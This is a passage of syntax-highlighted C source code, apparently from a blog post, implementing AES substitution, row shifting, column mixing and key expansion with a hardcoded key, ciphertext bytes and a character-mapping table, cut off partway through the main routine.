class="line">        </span><br><span class="line">        &#125;;<span class="comment">// 填充Sbox矩阵</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; count; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		row = (plaintext[i] &amp; <span class="number">0xF0</span>) &gt;&gt; <span class="number">4</span>;</span><br><span class="line">		column = plaintext[i] &amp; <span class="number">0x0F</span>;</span><br><span class="line">		plaintextencrypt[i] = Sbox[row][column];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">SubBytesRe</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *plaintext, <span class="type">unsigned</span> <span class="type">char</span> *plaintextencrypt, <span class="type">int</span> count)</span><span class="comment">/*S盒逆置换*/</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> row, column;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> Sbox[<span class="number">16</span>][<span class="number">16</span>] = &#123;</span><br><span class="line">		<span class="number">82</span>, <span class="number">9</span>, <span class="number">106</span>, <span class="number">213</span>, <span class="number">48</span>, <span class="number">54</span>, <span class="number">165</span>, <span class="number">56</span>, <span class="number">191</span>, <span class="number">64</span>, <span class="number">163</span>, <span class="number">158</span>, <span class="number">129</span>, <span class="number">243</span>, <span class="number">215</span>, <span class="number">251</span>, <span class="number">124</span>, <span class="number">227</span>, <span class="number">57</span>, <span class="number">130</span>, <span class="number">155</span>, <span class="number">47</span>, <span class="number">255</span>, <span class="number">135</span>, <span class="number">52</span>, <span class="number">142</span>, <span class="number">67</span>, <span class="number">68</span>, <span class="number">196</span>, <span class="number">222</span>, <span class="number">233</span>, <span class="number">203</span>, <span class="number">84</span>, <span class="number">123</span>, <span class="number">148</span>, <span class="number">50</span>, <span class="number">166</span>, <span class="number">194</span>, <span class="number">35</span>, <span class="number">61</span>, <span class="number">238</span>, <span class="number">76</span>, <span class="number">149</span>, <span class="number">11</span>, <span class="number">66</span>, <span class="number">250</span>, <span class="number">195</span>, <span class="number">78</span>, <span class="number">8</span>, <span class="number">46</span>, <span class="number">161</span>, <span class="number">102</span>, <span class="number">40</span>, <span class="number">217</span>, <span class="number">36</span>, <span class="number">178</span>, <span class="number">118</span>, <span class="number">91</span>, <span class="number">162</span>, <span class="number">73</span>, <span class="number">109</span>, <span class="number">139</span>, <span class="number">209</span>, <span class="number">37</span>, <span class="number">114</span>, <span class="number">248</span>, <span class="number">246</span>, <span class="number">100</span>, <span class="number">134</span>, <span class="number">104</span>, <span class="number">152</span>, <span class="number">22</span>, <span class="number">212</span>, <span class="number">164</span>, <span class="number">92</span>, <span class="number">204</span>, <span class="number">93</span>, <span class="number">101</span>, <span class="number">182</span>, <span class="number">146</span>, <span class="number">108</span>, <span class="number">112</span>, <span class="number">72</span>, <span class="number">80</span>, <span class="number">253</span>, <span class="number">237</span>, <span class="number">185</span>, <span class="number">218</span>, <span class="number">94</span>, <span class="number">21</span>, <span class="number">70</span>, <span class="number">87</span>, <span class="number">167</span>, <span class="number">141</span>, <span class="number">157</span>, <span class="number">132</span>, <span class="number">144</span>, <span class="number">216</span>, <span class="number">171</span>, <span class="number">0</span>, <span class="number">140</span>, <span class="number">188</span>, <span class="number">211</span>, <span class="number">10</span>, <span class="number">247</span>, <span class="number">228</span>, <span class="number">88</span>, <span class="number">5</span>, <span class="number">184</span>, <span class="number">179</span>, <span class="number">69</span>, <span class="number">6</span>, <span class="number">208</span>, <span class="number">44</span>, <span class="number">30</span>, <span class="number">143</span>, <span class="number">202</span>, <span class="number">63</span>, <span class="number">15</span>, <span class="number">2</span>, <span class="number">193</span>, <span class="number">175</span>, <span class="number">189</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">19</span>, <span class="number">138</span>, <span class="number">107</span>, <span class="number">58</span>, <span class="number">145</span>, <span class="number">17</span>, <span class="number">65</span>, <span class="number">79</span>, <span class="number">103</span>, <span class="number">220</span>, <span class="number">234</span>, <span class="number">151</span>, <span class="number">242</span>, <span class="number">207</span>, <span class="number">206</span>, <span class="number">240</span>, <span class="number">180</span>, <span class="number">230</span>, <span class="number">115</span>, <span class="number">150</span>, <span class="number">172</span>, <span class="number">116</span>, <span class="number">34</span>, <span class="number">231</span>, <span class="number">173</span>, <span class="number">53</span>, <span class="number">133</span>, <span class="number">226</span>, <span class="number">249</span>, <span class="number">55</span>, <span class="number">232</span>, <span class="number">28</span>, <span class="number">117</span>, <span class="number">223</span>, <span class="number">110</span>, <span class="number">71</span>, <span class="number">241</span>, <span class="number">26</span>, <span class="number">113</span>, <span class="number">29</span>, <span class="number">41</span>, <span class="number">197</span>, <span class="number">137</span>, <span class="number">111</span>, <span class="number">183</span>, <span class="number">98</span>, <span class="number">14</span>, <span class="number">170</span>, <span class="number">24</span>, <span class="number">190</span>, <span class="number">27</span>, <span class="number">252</span>, <span class="number">86</span>, <span class="number">62</span>, <span class="number">75</span>, <span class="number">198</span>, <span class="number">210</span>, <span class="number">121</span>, <span class="number">32</span>, <span class="number">154</span>, <span class="number">219</span>, <span class="number">192</span>, <span class="number">254</span>, <span class="number">120</span>, <span class="number">205</span>, <span class="number">90</span>, <span class="number">244</span>, <span class="number">31</span>, <span class="number">221</span>, <span class="number">168</span>, <span class="number">51</span>, <span class="number">136</span>, <span class="number">7</span>, <span class="number">199</span>, <span class="number">49</span>, <span class="number">177</span>, <span class="number">18</span>, <span class="number">16</span>, <span class="number">89</span>, <span class="number">39</span>, <span class="number">128</span>, <span class="number">236</span>, <span class="number">95</span>, <span class="number">96</span>, <span class="number">81</span>, <span class="number">127</span>, <span class="number">169</span>, <span class="number">25</span>, <span class="number">181</span>, <span class="number">74</span>, <span class="number">13</span>, <span class="number">45</span>, <span class="number">229</span>, <span class="number">122</span>, <span class="number">159</span>, <span class="number">147</span>, <span class="number">201</span>, <span class="number">156</span>, <span class="number">239</span>, <span class="number">160</span>, <span class="number">224</span>, <span class="number">59</span>, <span class="number">77</span>, <span class="number">174</span>, <span class="number">42</span>, <span class="number">245</span>, <span class="number">176</span>, <span class="number">200</span>, <span class="number">235</span>, <span class="number">187</span>, <span class="number">60</span>, <span class="number">131</span>, <span class="number">83</span>, <span class="number">153</span>, <span class="number">97</span>, <span class="number">23</span>, <span class="number">43</span>, <span class="number">4</span>, <span class="number">126</span>, <span class="number">186</span>, <span class="number">119</span>, <span class="number">214</span>, <span class="number">38</span>, <span class="number">225</span>, <span class="number">105</span>, <span class="number">20</span>, <span class="number">99</span>, <span class="number">85</span>, <span class="number">33</span>, <span class="number">12</span>, <span class="number">125</span>        &#125;;	<span class="comment">// 填充Sbox矩阵</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; count; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		row = (plaintext[i] &amp; <span class="number">0xF0</span>) &gt;&gt; <span class="number">4</span>;</span><br><span class="line">		column = plaintext[i] &amp; <span class="number">0x0F</span>;</span><br><span class="line">		plaintextencrypt[i] = Sbox[row][column];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">ShiftRowsRe</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *plaintextencrypt)</span><span class="comment">/*行移位的逆*/</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> temp = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)<span class="comment">//第i行</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span> - i; j++)<span class="comment">//第j次左移</span></span><br><span class="line">		&#123;</span><br><span class="line">			temp = plaintextencrypt[i];</span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">4</span>; k++)</span><br><span class="line">				plaintextencrypt[i + <span class="number">4</span> * k] = plaintextencrypt[i + <span class="number">4</span> * (k + <span class="number">1</span>)];</span><br><span class="line">			plaintextencrypt[i + <span class="number">12</span>] = temp;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">ShiftRows</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *plaintextencrypt)</span><span class="comment">/*行移位*/</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> temp = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)<span class="comment">//第i行</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; i; j++)<span class="comment">//第j次左移</span></span><br><span class="line">		&#123;</span><br><span class="line">			temp = plaintextencrypt[i];</span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">4</span>; k++)</span><br><span class="line">				plaintextencrypt[i + <span class="number">4</span> * k] = plaintextencrypt[i + <span class="number">4</span> * (k + <span class="number">1</span>)];</span><br><span class="line">			plaintextencrypt[i + <span class="number">12</span>] = temp;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> <span class="title function_">Mult2</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> num)</span><span class="comment">/*列混淆*/</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> temp = num &lt;&lt; <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span> ((num &gt;&gt; <span class="number">7</span>) &amp; <span class="number">0x01</span>)</span><br><span class="line">		temp = temp ^ <span class="number">27</span>;</span><br><span class="line">	<span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> <span class="title function_">Mult3</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> num)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> Mult2(num) ^ num;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">MixColumns</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *plaintextencrypt, <span class="type">unsigned</span> <span class="type">char</span> *plaintextcrypt)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">		plaintextcrypt[<span class="number">4</span> * i] = Mult2(plaintextencrypt[<span class="number">4</span> * i]) ^ Mult3(plaintextencrypt[<span class="number">4</span> * i + <span class="number">1</span>]) ^ plaintextencrypt[<span class="number">4</span> * i + <span class="number">2</span>] ^ plaintextencrypt[<span class="number">4</span> * i + <span class="number">3</span>];</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">		plaintextcrypt[<span class="number">4</span> * i + <span class="number">1</span>] = plaintextencrypt[<span class="number">4</span> * i] ^ Mult2(plaintextencrypt[<span class="number">4</span> * i + <span class="number">1</span>]) ^ Mult3(plaintextencrypt[<span class="number">4</span> * i + <span class="number">2</span>]) ^ plaintextencrypt[<span class="number">4</span> * i + <span class="number">3</span>];</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">		plaintextcrypt[<span class="number">4</span> * i + <span class="number">2</span>] = plaintextencrypt[<span class="number">4</span> * i] ^ plaintextencrypt[<span class="number">4</span> * i + <span class="number">1</span>] ^ Mult2(plaintextencrypt[<span class="number">4</span> * i + <span class="number">2</span>]) ^ Mult3(plaintextencrypt[<span class="number">4</span> * i + <span class="number">3</span>]);</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">		plaintextcrypt[<span class="number">4</span> * i + <span class="number">3</span>] = Mult3(plaintextencrypt[<span class="number">4</span> * i]) ^ plaintextencrypt[<span class="number">4</span> * i + <span class="number">1</span>] ^ plaintextencrypt[<span class="number">4</span> * i + <span class="number">2</span>] ^ Mult2(plaintextencrypt[<span class="number">4</span> * i + <span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*逆列混淆*/</span> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> xtime(x)   ((x<span class="string">&lt;&lt;1) ^ (((x&gt;</span>&gt;7) &amp; 1) * 0x1b))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> Multiply(x,y) (((y &amp; 1) * x) ^ ((y&gt;&gt;1 &amp; 1) * xtime(x)) ^ ((y&gt;&gt;2 &amp; 1) * xtime(xtime(x))) ^ ((y&gt;&gt;3 &amp; 1) * xtime(xtime(xtime(x)))) ^ ((y&gt;&gt;4 &amp; 1) * xtime(xtime(xtime(xtime(x))))))</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">MixColumnsRe</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *state)</span></span><br><span class="line">&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> a, b, c, d;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		a = state[<span class="number">4</span>*i];</span><br><span class="line">		b = state[<span class="number">4</span>*i+<span class="number">1</span>];</span><br><span class="line">		c = state[<span class="number">4</span>*i+<span class="number">2</span>];</span><br><span class="line">		d = state[<span class="number">4</span>*i+<span class="number">3</span>];</span><br><span class="line">		state[<span class="number">4</span> * i] = Multiply(a, <span class="number">0x0e</span>) ^ Multiply(b, <span class="number">0x0b</span>) ^ Multiply(c, <span class="number">0x0d</span>) ^ Multiply(d, <span class="number">0x09</span>);</span><br><span class="line">		state[<span class="number">4</span> * i + <span class="number">1</span>] = Multiply(a, <span class="number">0x09</span>) ^ Multiply(b, <span class="number">0x0e</span>) ^ Multiply(c, <span class="number">0x0b</span>) ^ Multiply(d, <span class="number">0x0d</span>);</span><br><span class="line">		state[<span class="number">4</span> * i + <span class="number">2</span>] = Multiply(a, <span class="number">0x0d</span>) ^ Multiply(b, <span class="number">0x09</span>) ^ Multiply(c, <span class="number">0x0e</span>) ^ Multiply(d, <span class="number">0x0b</span>);</span><br><span class="line">		state[<span class="number">4</span> * i + <span class="number">3</span>] = Multiply(a, <span class="number">0x0b</span>) ^ Multiply(b, <span class="number">0x0d</span>) ^ Multiply(c, <span class="number">0x09</span>) ^ Multiply(d, <span class="number">0x0e</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">CharToWord</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *character, <span class="type">int</span> first)</span><span class="comment">/*字节转字*/</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> (((<span class="type">int</span>)character[first] &amp; <span class="number">0x000000ff</span>) &lt;&lt; <span class="number">24</span>) | (((<span class="type">int</span>)character[first + <span class="number">1</span>] &amp; <span class="number">0x000000ff</span>) &lt;&lt; <span class="number">16</span>) | (((<span class="type">int</span>)character[first + <span class="number">2</span>] &amp; <span class="number">0x000000ff</span>) &lt;&lt; <span class="number">8</span>) | ((<span class="type">int</span>)character[first + <span class="number">3</span>] &amp; <span class="number">0x000000ff</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">WordToChar</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> word, <span class="type">unsigned</span> <span class="type">char</span> *character)</span><span class="comment">/*字转字节*/</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; character[i++] = (word &gt;&gt; (<span class="number">8</span> * (<span class="number">3</span> - i))) &amp; <span class="number">0xFF</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">ExtendCipherKey</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> *CipherKey_word, <span class="type">int</span> round)</span><span class="comment">/*密钥扩展*/</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> CipherKeyChar[<span class="number">4</span>] = &#123; <span class="number">0</span> &#125;,CipherKeyCharEncrypt[<span class="number">4</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> Rcon[<span class="number">10</span>] = &#123; <span class="number">0x01000000</span>,<span class="number">0x02000000</span>,<span class="number">0x04000000</span>,<span class="number">0x08000000</span>,<span class="number">0x10000000</span>,<span class="number">0x20000000</span>,<span class="number">0x40000000</span>,<span class="number">0x80000000</span>,<span class="number">0x1B000000</span>,<span class="number">0x36000000</span> &#125;;	<span class="comment">//轮常量</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">4</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (!(i % <span class="number">4</span>))</span><br><span class="line">		&#123;</span><br><span class="line">			WordToChar((CipherKey_word[i - <span class="number">1</span>] &gt;&gt; <span class="number">24</span>) | (CipherKey_word[i - <span class="number">1</span>] &lt;&lt; <span class="number">8</span>), CipherKeyChar);</span><br><span class="line">			SubBytes(CipherKeyChar, CipherKeyCharEncrypt, <span class="number">4</span>);</span><br><span class="line">			CipherKey_word[i] = CipherKey_word[i - <span class="number">4</span>] ^ CharToWord(CipherKeyCharEncrypt, <span class="number">0</span>) ^ Rcon[round];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			CipherKey_word[i] = CipherKey_word[i - <span class="number">4</span>] ^ CipherKey_word[i - <span class="number">1</span>];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line">  <span class="type">void</span> <span class="title function_">genString</span><span class="params">(<span class="type">int</span> size)</span>&#123;</span><br><span class="line">       <span class="type">char</span> *text = (<span class="type">char</span> *)<span class="built_in">malloc</span>(size * <span class="keyword">sizeof</span>(<span class="type">char</span>));</span><br><span class="line">       <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">       &#123;</span><br><span class="line">       text[i]=<span class="number">35</span>+i;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="built_in">puts</span>(text);</span><br><span class="line">       </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> table[]=<span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\&quot;#$%&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~ &quot;</span>;</span><br><span class="line"><span class="type">char</span> res[]=&#123;<span class="number">0x36</span>,<span class="number">0x35</span>,<span class="number">0x34</span>,<span class="number">0x33</span>,<span class="number">0x3a</span>,<span class="number">0x39</span>,<span class="number">0x38</span>,<span class="number">0x37</span>,<span class="number">0x3e</span>,<span class="number">0x3d</span>,<span class="number">0x85</span>,<span class="number">0x84</span>,<span class="number">0x83</span>,<span class="number">0x8a</span>,<span class="number">0x89</span>,<span class="number">0x88</span>,<span class="number">0x87</span>,<span class="number">0x8e</span>,<span class="number">0x8d</span>,<span class="number">0x8c</span>,<span class="number">0x8b</span>,<span class="number">0x92</span>,<span class="number">0x91</span>,<span class="number">0x90</span>,<span class="number">0x8f</span>,<span class="number">0x76</span>,<span class="number">0x75</span>,<span class="number">0x74</span>,<span class="number">0x73</span>,<span class="number">0x7a</span>,<span class="number">0x79</span>,<span class="number">0x78</span>,<span class="number">0x77</span>,<span class="number">0x7e</span>,<span class="number">0x7d</span>,<span class="number">0x7c</span>,<span class="number">0xa5</span>,<span class="number">0xa4</span>,<span class="number">0xa3</span>,<span class="number">0xaa</span>,<span class="number">0xa9</span>,<span class="number">0xa8</span>,<span class="number">0xa7</span>,<span class="number">0xae</span>,<span class="number">0xad</span>,<span class="number">0xac</span>,<span class="number">0xab</span>,<span class="number">0xb2</span>,</span><br><span class="line"><span class="number">0xb1</span>,<span class="number">0xb0</span>,<span class="number">0xaf</span>,<span class="number">0x96</span>,<span class="number">0x95</span>,<span class="number">0x94</span>,<span class="number">0x93</span>,<span class="number">0x9a</span>,<span class="number">0x99</span>,<span class="number">0x98</span>,<span class="number">0x97</span>,<span class="number">0x9e</span>,<span class="number">0x9d</span>,<span class="number">0x9c</span>,<span class="number">0x45</span>,<span class="number">0x44</span>,<span class="number">0x43</span>,<span class="number">0x4a</span>,<span class="number">0x49</span>,<span class="number">0x48</span>,<span class="number">0x47</span>,<span class="number">0x4e</span>,<span class="number">0x4d</span>,<span class="number">0x4c</span>,<span class="number">0x4b</span>,<span class="number">0x52</span>,<span class="number">0x51</span>,<span class="number">0x50</span>,<span class="number">0x4f</span>,<span class="number">0x3c</span>,<span class="number">0x3b</span>,<span class="number">0x42</span>,<span class="number">0x41</span>,<span class="number">0x40</span>,<span class="number">0x3f</span>,<span class="number">0xa6</span>,<span class="number">0x9b</span>,<span class="number">0xa2</span>,<span class="number">0xa1</span>,<span class="number">0xa0</span>,<span class="number">0x9f</span>,<span class="number">0x86</span>,<span class="number">0x7b</span>,<span class="number">0x82</span>,<span class="number">0x81</span>,<span class="number">0x80</span>,<span class="number">0x66</span>,<span class="number">0x66</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">char</span> <span class="title function_">getcc</span><span class="params">(<span class="type">char</span> in)</span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">96</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">if</span> (in==res[i])</span><br><span class="line">   &#123;</span><br><span class="line">    <span class="keyword">return</span> table[i];</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;**************AES加解密***************\n&quot;</span>);</span><br><span class="line">	<span class="type">int</span> i = <span class="number">0</span>, k;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> mm[]=&#123;<span class="number">0x71</span>,<span class="number">0x55</span>,<span class="number">0x7f</span>,<span class="number">0xa8</span>,<span class="number">0xfa</span>,<span class="number">0x0e</span>,<span class="number">0xa3</span>,<span class="number">0x19</span>,<span class="number">0xa0</span>,<span class="number">0x5c</span>,<span class="number">0xf9</span>,<span class="number">0x0e</span>,<span class="number">0x9b</span>,<span class="number">0x0b</span>,<span class="number">0x5e</span>,<span class="number">0xfc</span>,<span class="number">0xb5</span>,<span class="number">0xa8</span>,<span class="number">0x49</span>,<span class="number">0xfd</span>,<span class="number">0x90</span>,<span class="number">0x99</span>,<span class="number">0x74</span>,<span class="number">0xc7</span>,<span class="number">0x77</span>,<span class="number">0x02</span>,<span class="number">0x6a</span>,<span class="number">0xf5</span>,<span class="number">0x9a</span>,<span class="number">0x6a</span>,<span class="number">0xba</span>,<span class="number">0x7f</span>,<span class="number">0xfb</span>,<span class="number">0xe7</span>,<span class="number">0x68</span>,<span class="number">0xda</span>,<span class="number">0x54</span>,<span class="number">0xee</span>,<span class="number">0xe8</span>,<span class="number">0xbb</span>,<span class="number">0x78</span>,<span class="number">0x01</span>,<span class="number">0xe7</span>,<span class="number">0xbb</span>,<span class="number">0xa2</span>,<span class="number">0x95</span>,<span class="number">0x95</span>,<span class="number">0xfa</span>&#125;;</span><br><span class="line"></span><br><span class="line">   <span class="type">unsigned</span> <span class="type">char</span> PlainText[<span class="number">48</span>] =<span class="string">&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;</span></span><br><span class="line">    ,</span><br><span class="line">		CipherKey[<span class="number">16</span>] = &#123; <span class="number">0x05</span>,<span class="number">0x06</span>,<span class="number">0x07</span>,<span class="number">0x08</span>,<span class="number">0x37</span>,<span class="number">0x42</span>,<span class="number">0x4d</span>,<span class="number">0x58</span>,<span class="number">0x63</span>,<span class="number">0x00</span>,<span class="number">0x0a</span>,<span class="number">0x0c</span>,<span class="number">0x0d</span>,<span class="number">0x0e</span>,<span class="number">0x0f</span>,<span class="number">0x10</span> &#125;,</span><br><span class="line">		CipherKey1[<span class="number">16</span>] = &#123;  <span class="number">0x05</span>,<span class="number">0x06</span>,<span class="number">0x07</span>,<span class="number">0x08</span>,<span class="number">0x37</span>,<span class="number">0x42</span>,<span class="number">0x4d</span>,<span class="number">0x58</span>,<span class="number">0x63</span>,<span class="number">0x00</span>,<span class="number">0x0a</span>,<span class="number">0x0c</span>,<span class="number">0x0d</span>,<span class="number">0x0e</span>,<span class="number">0x0f</span>,<span class="number">0x10</span>&#125;,</span><br><span class="line">		PlainText1[<span class="number">48</span>] = &#123; </span><br><span class="line">              <span class="number">0x71</span>, <span class="number">0x55</span>, <span class="number">0x7F</span>, <span class="number">0xA8</span>, <span class="number">0xFA</span>, <span class="number">0x0E</span>, <span class="number">0xA3</span>, <span class="number">0x19</span>, <span class="number">0xA0</span>, <span class="number">0x5C</span>, <span class="number">0xF9</span>, <span class="number">0x0E</span>, <span class="number">0x9B</span>, <span class="number">0x0B</span>, <span class="number">0x5E</span>, <span class="number">0xFC</span>, </span><br><span class="line">    <span class="number">0xB5</span>, <span class="number">0xA8</span>, <span class="number">0x49</span>, <span class="number">0xFD</span>, <span class="number">0x90</span>, <span class="number">0x99</span>, <span class="number">0x74</span>, <span class="number">0xC7</span>, <span class="number">0x77</span>, <span class="number">0x02</span>, <span class="number">0x6A</span>, <span class="number">0xF5</span>, <span class="number">0x9A</span>, <span class="number">0x6A</span>, <span class="number">0xBA</span>, <span class="number">0x7F</span>, </span><br><span class="line">    <span class="number">0xFB</span>, <span class="number">0xE7</span>, <span class="number">0x68</span>, <span class="number">0xDA</span>, <span class="number">0x54</span>, <span class="number">0xEE</span>, <span class="number">0xE8</span>, <span class="number">0xBB</span>, <span class="number">0x78</span>, <span class="number">0x01</span>, <span class="number">0xE7</span>, <span class="number">0xBB</span>, <span class="number">0xA2</span>, <span class="number">0x95</span>, <span class="number">0x95</span>, <span class="number">0xFA</span></span><br><span class="line"> </span><br><span class="line">         &#125;,</span><br><span class="line">		PlainText2[<span class="number">48</span>] = &#123;   <span class="number">0x71</span>, <span class="number">0x55</span>, <span class="number">0x7F</span>, <span class="number">0xA8</span>, <span class="number">0xFA</span>, <span class="number">0x0E</span>, <span class="number">0xA3</span>, <span class="number">0x19</span>, <span class="number">0xA0</span>, <span class="number">0x5C</span>, <span class="number">0xF9</span>, <span class="number">0x0E</span>, <span class="number">0x9B</span>, <span class="number">0x0B</span>, <span class="number">0x5E</span>, <span class="number">0xFC</span>, </span><br><span class="line">    <span class="number">0xB5</span>, <span class="number">0xA8</span>, <span class="number">0x49</span>, <span class="number">0xFD</span>, <span class="number">0x90</span>, <span class="number">0x99</span>, <span class="number">0x74</span>, <span class="number">0xC7</span>, <span class="number">0x77</span>, <span class="number">0x02</span>, <span class="number">0x6A</span>, <span class="number">0xF5</span>, <span class="number">0x9A</span>, <span class="number">0x6A</span>, <span class="number">0xBA</span>, <span class="number">0x7F</span>, </span><br><span class="line">    <span class="number">0xFB</span>, <span class="number">0xE7</span>, <span class="number">0x68</span>, <span class="number">0xDA</span>, <span class="number">0x54</span>, <span class="number">0xEE</span>, <span class="number">0xE8</span>, <span class="number">0xBB</span>, <span class="number">0x78</span>, <span class="number">0x01</span>, <span class="number">0xE7</span>, <span class="number">0xBB</span>, <span class="number">0xA2</span>, <span class="number">0x95</span>, <span class="number">0x95</span>, <span class="number">0xFA</span></span><br><span class="line">  &#125;;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> CipherKey_word[<span class="number">44</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; CipherKey_word[i++] = CharToWord(CipherKey, <span class="number">4</span> * i));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;密钥：&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; <span class="number">16</span>; k++) <span class="built_in">printf</span>(<span class="string">&quot;%2X &quot;</span>, CipherKey[k]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n明文：&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; <span class="number">16</span>; k++) <span class="built_in">printf</span>(<span class="string">&quot;%02X &quot;</span>, PlainText[k]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n**************开始加密****************&quot;</span>);</span><br><span class="line">	AddRoundKey(PlainText, CipherKey);</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">9</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		SubBytes(PlainText, PlainText1, <span class="number">16</span>);<span 